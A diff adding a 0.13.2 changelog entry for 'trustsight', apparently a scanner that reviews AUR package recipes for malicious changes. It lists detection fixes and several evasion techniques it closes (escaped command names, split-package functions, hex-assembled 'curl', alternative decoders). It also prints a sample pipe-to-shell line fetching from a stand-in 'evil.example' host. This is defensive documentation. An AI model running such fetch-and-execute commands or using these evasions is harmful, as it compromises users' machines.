@@ -1,6 +1,6 @@
 # Changelog
 
-## [Unreleased]
+## [0.13.2] - 2026-08-15
 
 ### Added
 
@@ -797,6 +797,385 @@
   the correctness of expansion), and records three conditions under which it
   should be built. Nothing is scheduled; the point is that the current
   position is a choice with its reasoning written down.
+
+### Added
+
+- **`trustsight review --deps` reviews the dependencies instead of the
+  packages.** An AUR package's `depends` are built by the same `makepkg` run
+  on the same machine, and the June 2026 campaign is the argument for looking
+  at them: it hijacked orphans, and an orphan is far more often somebody's
+  dependency than the thing they meant to install. A default review already
+  analyses direct dependencies, but reports each as a *summary card* under the
+  package that pulled it in; this makes each one the subject of its own panel,
+  with its findings, its diff and its verdict.
+
+  Each dependency reports **Required by**: the packages in the reviewed set
+  that declare it. That is the reverse of the relationship the rest of the
+  report describes, and it needed its own walk. `walk_dependencies` shares its
+  `already_seen` across roots so a dependency twenty packages need is analysed
+  once - right for a per-package report, and wrong here, because it attributes
+  the dependency to whichever root reached it first. `dependency_closure` keeps
+  every edge and analyses each package once.
+
+  `--depth` applies to the closure: `--deps --depth 2` reviews direct
+  dependencies *and theirs*, rather than walking two levels below each. Roots
+  are not reviewed - that is the no-flag view. The same `MAX_DEPTH_LEVELS` and
+  `MAX_DEPTH_NODES` ceilings bound the walk, because the graph is written by
+  the party under review, and a closure cut short says so.
+
+  `required_by` is in the JSON body and on `Report` too, and
+  `TrustSight.review(deps=True)` is the API's spelling of the flag - a field
+  the API can carry but never populate is a field that does nothing, and the
+  closure walk lives in the engine so both surfaces reach the same one. An
+  ordinary review now ends with a one-line pointer at the flag, shown only when
+  something reported a dependency: advice about an empty set is noise, and so
+  is advice you already followed.
+
+- **Documentation caught up with the terminal.** The quickstart still showed a
+  three-column `Package / Risk Score / Verdict` table that the tool has not
+  rendered in a long time - and showed a score column by default, which is the
+  opposite of what it does. The `inspect` sample printed `Status` twice and
+  described the plain renderer as "a condensed subset", both of which were true
+  before this release and are not now. The README's 30-second example carried
+  the doubled rule id and `checksums checksum added or changed` verbatim, which
+  is where the report of those defects came from. Every sample in the docs is
+  now generated from the renderers rather than written by hand.
+
+### Changed
+
+- **Crossfire asks which *file* a line is in, not which function.** The scope
+  gate was an allowlist of the five standard makepkg function names, and the
+  function a payload sits in is chosen by the person being reviewed. Four
+  spellings walked past all seven rules:
+
+    - `package_libfoo()` - a **split package**. makepkg calls
+      `package_$pkgname()` for each name in a split recipe, so renaming
+      `package` was a one-word bypass. It is the commonest function shape in
+      the AUR after the standard five.
+    - `package_google-chrome-bin()` - worse: a pkgname may hold a hyphen and
+      the shared classifier's `\w+` does not match one, so the header matched
+      *neither* function expression. The body classified as `other`, invisible
+      to every rule with a scope, not just this family. Fixed in `rules.py`
+      with makepkg's own name class.
+    - `_helper()`, called from `build()`.
+    - a payload at **top level**, which runs when makepkg *sources* the
+      recipe, before any build step - something the project already documents
+      under `unresolved_parse_time` and the rules were not reading.
+
+  A `PKGBUILD`, a `.install` scriptlet and a shell companion are shell from
+  the first line to the last, top level included; a `.desktop`, a `.patch` and
+  a `.SRCINFO` are not shell in any scope, which is a sharper exclusion than
+  the old gate managed even when it worked.
+
+  Widening it exposed four parser gaps the narrow gate had been hiding, each a
+  line whose command position lives elsewhere: a multi-line array literal
+  (`depends=(` then one entry per line), a multi-line `[[ ]]` test, a
+  multi-line double-quoted string, and `[[ -n "$a" && "$a" != "$b" ]]` being
+  split on its `&&` - a conditional that mentions a variable is most of the
+  shell ever written. Plus one that was never about position: `command -v
+  "$cmd"` asks where `$cmd` is and runs nothing.
+
+  The family still fires on **zero** of the 3,246-diff benign corpus.
+
+- **The crossfire family fires on zero of the 3,246-diff benign corpus, down
+  from X002's 0.678%, while eleven more evasions are closed - ten here and one
+  in the tokenizer.** Rate and recall
+  moved in opposite directions, which is the only combination worth having, and
+  it happened because none of the false positives were arguments about what
+  counts as evasion. Every one was a rule looking in the wrong place.
+
+    - **Function scope leaked across file boundaries.** A hunk shows part of a
+      file, so a `package() {` whose closing brace fell outside it left the
+      brace counter raised for the rest of the diff, placing every *following
+      file* inside that function. A `.desktop` file's translated `Name[be]=`
+      line was read as shell and matched X002's homoglyph shape - Cyrillic in a
+      translation impersonates nothing and names no command. Fixed in the
+      shared classifier in `rules.py`, so every scoped rule gets the
+      correction, not just this family.
+    - **A modified continuation tail lost its head.** The joiner joins lines
+      carrying the same diff marker, so editing the tail of a `\`-continued
+      command separates the halves with the removed version. The `+` line
+      arrived alone and its first word - an argument to a command two lines up
+      - read as a command name.
+    - **`eval` was scored twice.** R039 already claims
+      eval-of-dynamic-content; treating `eval` as a wrapper walked into its
+      argument and drew a second CRITICAL on the same bytes. That is the thing
+      this family says it never does, and the reason there is no X008 beside
+      R013.
+    - **A variable naming a directory is not a hidden command.**
+      `"$srcdir/calibre-release/calibre-debug"` spells its executable out. The
+      shape matched it because the variable name was allowed to match a
+      *prefix* of itself, so `${pkgdir}/etc/x` read as `${pkgdi}` + `r`. Now
+      the name is maximal, and a `/` after it means a path while an operator
+      inside the braces (`${c//X/}`) still means assembly.
+    - **`CMD=$(which x)` names its executable literally**, one line up, where
+      every payload rule reads it. Exempted as the discovery idiom rather than
+      as assignment in general: `CMD=$(printf '\x63\x75\x72\x6c')` assembles a
+      name that appears nowhere and stays an evasion.
+
+  The ten closed here: `if`/`elif`/`while`/`until` each take a command and test
+  its exit status, and the scan stopped at the keyword - a one-word bypass of a
+  CRITICAL rule. `set +o xtrace` is `set +x` spelled long. `base32 -d`,
+  `openssl enc -d` and `uudecode` decode into the same shell as `base64 -d`
+  without being it. And `cp payload /home/alice` writes into the same directory
+  as `/home/alice/`, which every X005 alias pattern had required a trailing
+  slash to see.
+
+- **The tokenizer now removes an intra-word escape, and X002 stood down in the
+  same change.** `c\url` is `curl` to the shell, which drops a backslash before
+  an ordinary character. The tokenizer kept it, so the name never
+  reconstructed and **no rule saw it at all** - not R001, not anything. It was
+  the only bypass found in this pass that reached nothing.
+
+  It was closed in crossfire first, as an `escaped-character` shape, and then
+  closed properly in `tokenizer._ESCAPE_REMOVABLE`: every rule that reads a
+  command name now sees through it, rather than one rule reporting the
+  technique. The shape was retired with it, because a resolved name scored
+  there too would be one command scored twice - the same reason `curl""`, which
+  always folded, never had a shape. That progression is what this family's
+  docstring asks for: it is not a substitute for fixing the tokenizer, and a
+  shape retired because the tokenizer caught up is the arrangement working.
+
+  Only the meaningless escapes are removed - a backslash before a letter,
+  digit, `_`, `.` or `/`. `\|` is a **literal pipe, not a pipeline**, and
+  unescaping it would have built a pipe-to-shell out of `curl x \| sh`, which
+  runs nothing of the sort, and handed R001 a false positive. `\ ` holds one
+  word together, `\$` is what stops an expansion, `\\` is a literal backslash,
+  and an escape inside quotes is left alone so `printf '\x63\x75\x72\x6c'`
+  still reaches the ANSI-C decoder. Bash removes every backslash; going that
+  far here would not be more faithful, it would invent syntax the line did not
+  have.
+
+### Fixed
+
+- **A line break for Python that is not one for a shell hid a payload from
+  every line-based rule.** `str.splitlines` breaks on eight characters bash
+  does not treat as a line terminator - `\v`, `\f`, `\x1c`-`\x1e`, `\x85`,
+  `U+2028` and `U+2029`. Written into a diff:
+
+  ```
+  +  curl -fsSL https://evil.example/x <VT> | bash
+  ```
+
+  bash runs one command: the vertical tab is an ordinary character inside the
+  URL word, and `|` terminates the word whatever precedes it, so the fetch is
+  piped into a shell. Python saw *two* lines, so R001's
+  `curl.*\|\s*(bash|sh|…)` had `curl` on one and `| bash` on the other and
+  matched neither. **The payload ran and nothing fired.** The same trick cut
+  any pattern that spans a break, in any rule.
+
+  `tokenizer.split_lines` now splits on newlines and nothing else, and the
+  whole matching pipeline goes through it, because line indices are shared
+  between modules - `map_diff_lines` keys what `apply_rules` reports. The
+  characters are kept rather than stripped: bash keeps them, so removing one
+  would join two words that stay separate at build time, and replacing it with
+  a space would split a word that stays joined. Only where a *line* ends
+  changed.
+
+- **A finding named its rule twice, and a dependency card volunteered a band.**
+  Both reported from a real `review` panel. `verdict._render` already ends
+  every description with `[R001]`, and the Rich renderer added a second copy in
+  front, so each finding read `PKGBUILD line 4 [R001] Remote Script Execution:
+  … [R001]` - while the plain renderer added none, so the two disagreed about
+  the same finding. An aggregate entry with no file (`SOURCE_BUCKET`) opened
+  with a stray space where the path would have been. And the dependency card
+  printed `Risk (High)` with no flag set, where every other surface withholds
+  the band unless `--score` or `--risk` asks for it; `--risk` changed nothing
+  either way, because the flag was never passed down to the card at all.
+
+- **A first analysis threw away the findings it had just made.** The most
+  serious of a batch found by hunting the *shape* of the metadata-snapshot bug
+  rather than its details: something computed, recorded, and then not read.
+
+  `_make_fresh_analysis` ran the recency check, the new-package check and the
+  committed-tree scan, handed the results to `insert_analysis`, and then built
+  the fact with an empty `score_breakdown` and a hardcoded score of 0. A
+  first-seen package shipping an ELF binary in its git tree - R118, the Atomic
+  Arch delivery shape - reported **Low, score 0, no findings**, with the
+  finding sitting in the database row it had just written. First-seen is the
+  case with the least prior evidence about a package, so it is the last one
+  that should be reported clean without looking. The corpus path in
+  `full_aur/analyze.py` had been scoring its own first-seen facts all along;
+  the two had drifted. The review path now uses the same scorer, and carries
+  the maintainer and the IOC matches it can also see without a diff.
+
+- **`[limits] default_review_limit` was documented, shipped, and never read.**
+  `--limit`'s own default of `0` won on every invocation, so a user who set the
+  key saw no change. It is honoured now, and the shipped value moves from `20`
+  to `0`: a review that stops early has not looked at the rest, and narrowing
+  what an existing install covers is the wrong direction for the default. An
+  explicit `--limit 0` still means all of them and beats the config.
+
+- **A truncated review reported the truncation as a smaller problem.** With
+  `--limit 5` against 40 outdated packages the summary read "5 package(s)
+  needing update and reviewed": the count of packages *needing* an update was
+  silently replaced by the count the limit let through, so the number was wrong
+  in the direction that reads as reassuring, and the 35 skipped were never
+  mentioned. The summary now names them.
+
+- **Two sections existed only on the Rich renderer.** `inspect` without Rich
+  showed no *Resolved commands* section at all - the reconstructed command text
+  behind a finding, the deobfuscated `curl` a rule matched on - and no
+  maintainer or line counts. `review --verbose` handed off to the full inspect
+  panel on the Rich path and returned the same summary on the plain one, so
+  asking for detail got you detail only if Rich happened to be installed. Both
+  renderers now carry the same sections, and `tests/test_output_parity.py`
+  compares them against each other rather than only against the JSON body,
+  which is what let the gap sit there: the fixture never populated
+  `execution_changes`, and a renderer exercised with an empty section is not
+  exercised.
+
+- **The AUR-side version dropped the declared `epoch` and `pkgrel`.** Reported
+  by the maintainer of `oolite-git`, whose recipe declares `epoch=1`,
+  `pkgver=1.93.1.r7966.7ccbff5e` and `pkgrel=2`, against an install of
+  `1:1.93.1.r7967.caea422f-2`. `inspect` rendered the right-hand side as
+  `1.93.1.r7966.7ccbff5e`, because `get_pkgver_from_head` matched `^pkgver=`
+  and nothing else. The two sides of that line were not the same kind of
+  object.
+
+  It was not only display. `compare_installed_to_aur` compares epochs first
+  and parses an absent one as zero, so a **non-VCS** package declaring
+  `epoch=1` compared 1 against 0 and came out as *installed ahead*: a real
+  update reported as a backwards move. `oolite-git` never reached that branch
+  only because the VCS short-circuit fires first.
+
+    - `full_version_from_pkgbuild` assembles `[epoch:]pkgver[-pkgrel]` from
+      the recipe's own fields. A component that is not literal - `pkgver=$_ver`
+      - is omitted rather than guessed at, and no literal `pkgver=` at all
+      returns nothing, leaving the existing fallbacks in charge.
+    - With both sides full, they are compared as full versions, pkgrel
+      included, which is what pacman and every AUR helper do. An AUR `pkgrel`
+      bump is now the update it always was; it used to render as "no change"
+      even though discovery had just listed the package as outdated on
+      exactly that difference. A side that declares no pkgrel still compares
+      by epoch and pkgver alone - a pkgrel that was never declared cannot be
+      a difference.
+
+- **"Not comparable" never said why, so the reporter reasonably blamed the
+  epoch.** `oolite-git` is inconclusive because it computes its version in
+  `pkgver()`, which is a deliberate refusal: the AUR text records whatever
+  the maintainer's last build produced, so it is stale by design rather than
+  predictive. That reasoning was in the source and not in the output. The
+  version line now names the cause, and distinguishes it from the other case
+  the same constant covers - a version that could not be read at all -
+  without adding a field to the report body.
+
+- **A first analysis still drew the backwards arrow.** The reporter's first
+  `inspect` printed `1:1.93.1.r7967.caea422f-2 -> 1.93.1.r7966.7ccbff5e` and
+  the second, with a prior analysis on record, printed "not comparable":
+  whether a downgrade was drawn as an update depended on how many times the
+  package had been inspected. `_make_fresh_analysis` never set
+  `version_comparison`. The suppression added in 0.12.0 had landed on the
+  incremental path only.
+
+- **The inspect panel printed `First analysis.[]` and said Status twice.**
+  `[]` is not a Rich close tag, so it rendered literally and the style never
+  closed; the same row duplicated the Status line the foot of the panel emits
+  unconditionally.
+
+- **A quadratic pattern was scored safe because its alphabet was punctuation.**
+  `_representatives` harvested escapes, character classes and the first
+  *alphanumeric* literal, so `/+$` derived no alphabet at all, `growth_ratio`
+  fell back to probing with `a` - which `/` can never match - and both
+  measurements came back at zero. Zero is below the noise floor, the growth
+  check was skipped, and a skipped measurement scored the same as a fast one.
+  The module's docstring had already named this class of failure: "a fixed
+  probe list is the attacks somebody thought of, and the classes it omits
+  score zero rather than unknown". The `or ["a"]` fallback was the same trap
+  one level down, unguarded.
+
+    - Literals are now harvested whatever their character class, with the
+      pattern's *syntax* - a `:` from `(?:`, a digit from `{1,64}`, a class
+      body - stripped first, since probing with syntax is the same wrong
+      alphabet in a different costume.
+    - The fallback for a pattern whose alphabet cannot be derived is several
+      characters wide, and says in place that unmeasured is unknown, not safe.
+    - The widened detector immediately caught a **shipped** rule: R007's
+      `\+.*\.install.*` is quadratic. It is now `^\+.*\.install`, matching
+      exactly the same text on an added line, where the diff marker is at
+      position 0. An installation written before this release still holds the
+      old pattern and, because a refused pattern stops matching *silently*,
+      would lose the rule: the superseded pattern is registered so
+      `trustsight config sync-rules --update` repairs it, `trustsight lint`
+      reports it as an ERROR, and the refusal log now names the pattern.
+
+- **`review` compared against a metadata snapshot it never refreshed, so a
+  machine with pending AUR updates was told it had none.** Reported from a
+  0.13.1 install where `trustsight review` printed "No outdated packages
+  found" while `yay -Syu` listed four AUR updates on the same system. The
+  snapshot was downloaded on first run and reused unconditionally from then
+  on: `load_metadata` recorded `snapshot_time` and no caller ever read it,
+  and the only code path that refetches the dump is the corpus builder, which
+  a `review`-only user never runs. So this was not an edge case, it was every
+  installation's steady state after the first day.
+
+  The failure mode is what makes it severe rather than merely wrong. A stale
+  snapshot does not produce an error or an empty result: every installed
+  package resolves to the version the snapshot recorded, `vercmp` says they
+  are equal, and the tool answers "nothing to review" in green. The one
+  output a security tool must never produce quietly is *all clear* when it
+  has not looked.
+
+    - The snapshot is now refetched once it is older than
+      `[discovery] metadata_ttl_minutes` (default 60, matching the RPC path's
+      `cache_ttl_minutes`), and `load_snapshot` returns the timestamp
+      alongside the packages so the age cannot be dropped on the floor again.
+    - A snapshot with no recorded timestamp counts as stale, so an existing
+      install self-heals on its next review rather than needing the file
+      deleted by hand.
+    - A refresh that fails keeps the snapshot on disk and **warns**, naming
+      its age and saying a package updated since then will not be reported.
+      Falling back to "no outdated packages" on a network failure would
+      reproduce the original bug at the moment the user is least able to
+      notice it. An empty dump is refused for the same reason: it would
+      overwrite a working snapshot with nothing.
+    - `metadata_ttl_minutes = 0` restores the old behaviour for an offline
+      machine that must pin the snapshot it has.
+
+- **The AUR PKGBUILD advertised v0.13.1 with v0.13.0's checksum.** Reported
+  by a user, and accurate: the recorded `f083582...` is the v0.13.0 tarball,
+  while v0.13.1 hashes to `6c19cea4...`. The checksum was written by a second
+  commit *after* the tag, because GitHub's on-demand archive cannot exist
+  until the tag does, so every release passed through a window where the
+  branch was inconsistent. For v0.13.1 the workflow that closes that window
+  failed and the window never closed. Contributing cause: `check()` run from
+  the release tarball failed three tests, one of which was a direct
+  contradiction between `.gitattributes export-ignore` (which removes
+  `packaging/` from the archive) and the `critical paths are synchronised`
+  gate (which required `packaging/aur/PKGBUILD` to exist).
+
+### Changed
+
+- **The source is a release asset built by this repository, not GitHub's
+  generated archive.** `scripts/build_release_tarball.py` produces the
+  tarball deterministically: mtimes, uid/gid and member order normalised,
+  gzip given no timestamp, output a pure function of the paths and contents
+  `git archive` selects. Because `packaging/` is export-ignored, recording
+  the checksum in the PKGBUILD cannot change the tarball it describes, so the
+  checksum ships in the same commit as the version bump and no repair step
+  exists to fail. Release assets are immutable, which also closes the
+  long-standing exposure to GitHub regenerating archives and invalidating
+  recorded checksums, as it did ecosystem-wide in 2023.
+
+- **`release-pkgbuild.yml` verifies instead of repairing.** It no longer
+  computes a checksum or commits to the default branch. On a published
+  release it rebuilds the tarball from the tag, asserts the PKGBUILD already
+  records that checksum, asserts the published asset is those exact bytes,
+  and then builds and installs it with `check()` enabled.
+
+- **The critical-path existence check tolerates the archive.**
+  `ARCHIVE_EXCLUDED_PATHS` in `scripts/critical_paths.py` names the paths
+  `export-ignore` legitimately removes; the gate skips their existence check
+  when running from an extracted tarball and enforces it everywhere else.
+  `test_packaging_is_export_ignore_from_archives` skips when there is no git
+  checkout to archive rather than failing on `dubious ownership`.
+
+### Stats
+
+- 6 commits since v0.13.1
+- 2599 tests (57 files), all passing
+- 65/65 security gates, 10/10 calibration gates
+- Package version 0.13.2
 
 ## [0.13.1] - 2026-08-12
 
